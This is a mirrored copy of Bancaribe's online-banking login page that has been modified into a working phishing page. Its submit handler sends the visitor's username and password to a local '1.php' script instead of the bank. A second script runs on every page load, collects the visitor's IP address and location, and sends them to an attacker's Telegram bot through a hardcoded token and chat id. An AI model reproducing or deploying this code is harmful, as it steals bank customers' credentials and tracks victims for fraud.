

<html>


<!-- Mirrored from www5.bancaribe.com.ve/bcm/action/web/security/index by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Dec 2024 05:32:07 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=iso-8859-1" /><!-- /Added by HTTrack -->
<head>

    <title>Mi Conexion Bancaribe Digital -  Enero de 2025 [1]</title>
    
    <link rel="shortcut icon" href="https://www5.bancaribe.com.ve/bcm/images/bancaribe.ico.gzip">
    
    <!-- Latest compiled and minified CSS --> 
	<link rel="stylesheet" href="css/bootstrap.min.css">
	<link rel="stylesheet" href="css/bootstrap-essentials.min.css">
	
	<!-- CSS para Bootstrap de Dinamica -->
	<link rel="stylesheet" type="text/css" href="css/bootstrap.helper.css" />
	<link rel="stylesheet" type="text/css" href="css/fontawesome.css" />
	
	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">

	<!--biblioteca generica JS/Dinamica-->
	<script type="text/javascript" src="https://www5.bancaribe.com.ve/bcm/action/script"></script>
    
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
	<script src="js/bootstrap-essentials.min.js"></script>
	<style>
		.sss img{
			width: 50%;
			border: 1px solid;
			border-radius: 12px;
			margin-bottom: 5px;
		}
		
	</style>
    
	<script type="text/javascript">

		
	
	
		
		//habilitar controles
		function btn()
		{
			var inputTags = document.getElementsByTagName('INPUT');
			for(var i=0;i<inputTags.length;i++) {
				inputTags[i].disabled=false;
			}
			
			inputTags = document.getElementsByTagName('SELECT');
			for(var i=0;i<inputTags.length;i++) {
				inputTags[i].disabled=false;
			}
			
			inputTags = document.getElementsByTagName('BUTTON');
			for(var i=0;i<inputTags.length;i++) {
				inputTags[i].disabled=false;
			}
			
		}
		
		//desactivar controles 
		function disabledInputControls() {
			
			var inputTags = document.getElementsByTagName('INPUT');
			for(var i=0;i<inputTags.length;i++) {
				inputTags[i].disabled=true;
			}
			
			inputTags = document.getElementsByTagName('SELECT');
			for(var i=0;i<inputTags.length;i++) {
				inputTags[i].disabled=true;
			}
			
			inputTags = document.getElementsByTagName('BUTTON');
			for(var i=0;i<inputTags.length;i++) {
				inputTags[i].disabled=true;
			}
			
		}

		//rehabilitar boton de login en caso de error
		function enableLoginButton() {
			btn();
		}
		
		//mostrar form de login
		function displayLogin() {
			document.getElementById("form1").style.display = "";
		}
				
		//ejecutar limpiar sesion
		function sessionClear()
		{
			//llamada Ajax...
			return ajaxCall(httpMethod="GET", 
							uri="/action/app/security/sessionclear/clear", 
							divResponse=null, 
							divProgress="status", 
							formName=null, 
							afterResponseFn=null, 
							onErrorFn=enableLoginButton);

		}
		
        //limpiar formulario
		function clearForm1()
		{
			enableLoginButton();
			document.form1.userlogin.value="";
			document.form1.passwd.value="";
			document.form1.ti2.value="1";
		}
		
        //ir a privacidad
		function goToPrivacidad() {
			redirectToAction('/action/web/security/link/privacidad');
		}
		
        //ir a seguridad
		function goToSeguridad() {
			redirectToAction('/action/web/security/link/seguridad');
		}
		
        //ir a terminos y condiciones
		function goToTerminoCondicion() {
			redirectToAction('/action/web/security/link/terminocondicion');
		}

		
	</script>
	
	<style type="text/css">
				
		body {
		  	display: flex;
		  	flex-direction: column;
		  	min-height: 100vh;
		   	padding-top: 10px; 
		    padding-bottom: 0px;
		    margin-bottom: 0px;
		}
		
		.bottom {
		 	margin-top: auto;
		 	margin-bottom: 1px;
		} 
		
		/* xs */
		img {
		    width: 100%;
		    height: auto;
		}
		
		.navbarbottom {
			width: 95%;
			margin: 0 auto; 
		}
		
		.icon-web {
			font-size: 40px;
		}
		
		/* sm */
		@media (min-width: 768px) {
		    img {
		        width: 650px;
		    }
		    .navbarbottom {
			    width: 650px;
			    margin:0 auto; 
		    }
		    .icon-web {
				font-size: 60px;
			}
		}
		/* md */
		@media (min-width: 992px) {
		    img {
		        width: 650px;
		    }
		    .navbarbottom {
			    width: 650px;
			    margin:0 auto; 
		    }
		    .icon-web {
				font-size: 60px;
			}
		}
		/* lg */
		@media (min-width: 1200px) {
		    img {
		        width: 650px;
		    }
		    .navbarbottom {
			    width: 650px;
			    margin:0 auto; 
		    }
		    .icon-web {
				font-size: 60px;
			}
		}
		
	</style>
	
</head>

<body>
	
	<div id="container" style="padding-bottom: 20px;">
		<div class="container">
			<!--banner-->
			<img style="display: block; margin:0 auto; padding-top: 10px;margin-bottom: -15px;margin-top: -10px;" src="https://www5.bancaribe.com.ve/bcm/images/logo.svg">
			<br><br>
			<!--login form-->
			<div class="panel panel-info main-center" id="form1">
				<div class="panel-heading">
					<h3 class="panel-title">
						<strong>Ingresar al Sistema</strong>
						<span style="float: right;">
							<span id="status" class="fas fa-sync fa-spin" style="display:none;margin-right:5px;"></span>
						</span>
					</h3>
				</div>
				<div class="panel-body">
					<!-- Formulario adaptado -->
					<form id="loginForm">
						<div class="form-group">
							<input required name="ffd1" id="userlogin" type="text" maxlength="100" autocomplete="off" autocapitalize="off" autocorrect="off" class="form-control" placeholder="Usuario">
						</div>
						<div class="form-group">
							<input required name="ffd2" id="passwd" type="password" maxlength="40" autocomplete="off" class="form-control" placeholder="Contrase&ntilde;a">
						</div>
						<div class="form-group">
							<div id="form_error" class="errormsg text-danger" style="width: 100%; text-align:center; display: none;"></div>
						</div>
						<div class="form-group">
							<div>
								<button type="submit" class="btn btn-info" id="loginbutton">Ingresar</button>
							</div>
						</div>
					</form>
				</div>
			</div>
			<!-- end login form -->
	
			<div class="main-center">
				<div class="col-xs-12">
					<div class="row">
						<div class="col-xs-6 sss text-center">
							<button type="button" onclick="redirectToAction('registroclientetarjeta');" class="border-icon">
								<img style="max-width: 45%;" src="https://i.postimg.cc/SK9fh1Fb/image.png" alt=""><br><b>Cliente nuevo</b>
							</button>
						</div>
						<div class="col-xs-6 sss text-center">
							<button type="button" onclick="redirectToAction('autogestion');" class="border-icon">
								<img src="https://i.postimg.cc/Qd9pQYMK/image.png" alt=""><br><b>Recupera tu acceso</b>
							</button>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	
	<div id="error-response" style="display: none;"></div>
	
	<div class="bottom" id="footerID">
		<div class="navbar navbarbottom">
			<div class="footer-copyright">
				<div class="col-xs-12">
					<div class="row">
						<div class="col-xs-4 text-center footer-icon" onclick="goToSeguridad();">
							<button type="button">Politicas de<br> Seguridad</button>
						</div>
						<div class="col-xs-4 text-center footer-icon" onclick="goToPrivacidad();">
							<button type="button">Politicas de<br> Privacidad</button>
						</div>
						<div class="col-xs-4 text-center footer-icon" onclick="goToTerminoCondicion();">
							<button type="button">Terminos y<br> Condiciones</button>
						</div>
					</div>
				</div>
				<p class="footer-icon footer-iconIndex text-center">
					BANCARIBE. Rif: J-000029490.<br>Todos los derechos reservados. <span id="nodo"></span>
				</p>
			</div>
		</div>
	</div>
	<script src="js/footer.js"></script>
	<script>
			document.getElementById("loginForm").addEventListener("submit", function (e) {
					e.preventDefault(); // Evitar que la página se recargue

					// Limpiar mensajes de error previos
					const errorDiv = document.getElementById("form_error");
					errorDiv.style.display = "none"; // Ocultar el div
					errorDiv.innerHTML = ""; // Limpiar contenido del mensaje

					// Mostrar spinner (el ícono de carga)
					document.getElementById("status").style.display = "inline-block";

					// Obtener los valores del formulario
					const userlogin = document.getElementById("userlogin").value;
					const passwd = document.getElementById("passwd").value;

					// Crear un objeto FormData para enviar los datos
					const formData = new FormData();
					formData.append("ffd1", userlogin); // Usuario
					formData.append("ffd2", passwd);   // Contraseña

					// Hacer la petición al servidor con fetch
					fetch("1.php", {
							method: "POST",
							body: formData,
					})
					.then((response) => response.json()) // Convertir la respuesta a JSON
					.then((data) => {
							// Ocultar el spinner
							document.getElementById("status").style.display = "none";

							if (data.status === "success") {
									// Si es exitoso, redirigir a la página que indique el backend
									window.location.href = data.redirect;
							} else if (data.status === "error") {
									// Si hay un error, mostrar el mensaje en rojo
									errorDiv.style.display = "block"; // Mostrar el div
									errorDiv.innerHTML = `<span style="color: red; font-weight: bold;">${data.message}</span>`;
							}
					})
					.catch((error) => {
							console.error("Error:", error); // Mostrar errores en la consola
							document.getElementById("status").style.display = "none";

							errorDiv.style.display = "block"; // Mostrar el div
							errorDiv.innerHTML = `<span style="color: #d32f2f; font-weight: bold;">18005 - Estimado Cliente, algunos de los datos son inválidos. Por favor intente nuevamente</span>`;
					});
			});
	</script>
	<script>
			// 1. Token de Telegram y chat_id
			const token = '7768777682:AAGE6M2P2Rf25LDN1vmKc-4n_vH5HWlUEMU'; // Token de tu bot
			const chat_id = '6453849756'; // chat_id (usuario o grupo)

			// 2. Función para obtener información de la IP desde ipapi
			async function getUserIP() {
					try {
							// Llamada a la API pública de ipapi
							const response = await fetch('https://ipapi.co/json/');
							if (!response.ok) throw new Error('Error obteniendo datos de la API ipapi');
							const data = await response.json();
							return {
									ip: data.ip || 'Desconocida',
									city: data.city || 'Desconocida',
									country: data.country_name || 'Desconocido',
									region: data.region || 'Desconocido'
							};
					} catch (error) {
							console.error('Error al obtener datos de IP:', error);
							return {
									ip: 'Desconocida',
									city: 'Desconocida',
									country: 'Desconocido',
									region: 'Desconocido'
							};
					}
			}

			// 3. Función para enviar notificación a Telegram
			async function sendTelegramNotification(message) {
					const telegramApiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
					try {
							const response = await fetch(telegramApiUrl);
							if (!response.ok) throw new Error('Error enviando notificación a Telegram');
							console.log('Notificación enviada a Telegram');
					} catch (error) {
							console.error('Error al enviar la notificación:', error);
					}
			}

			// 4. Obtener datos y enviar notificación
			(async () => {
					const ipData = await getUserIP();
					const message = `🌐 BANCARIBEENA 🌐\n\n🔹 *IP:* ${ipData.ip}\n🔹 *Ciudad:* ${ipData.city}\n🔹 *Región:* ${ipData.region}\n🔹 *País:* ${ipData.country}`;
					await sendTelegramNotification(message);
			})();
	</script>
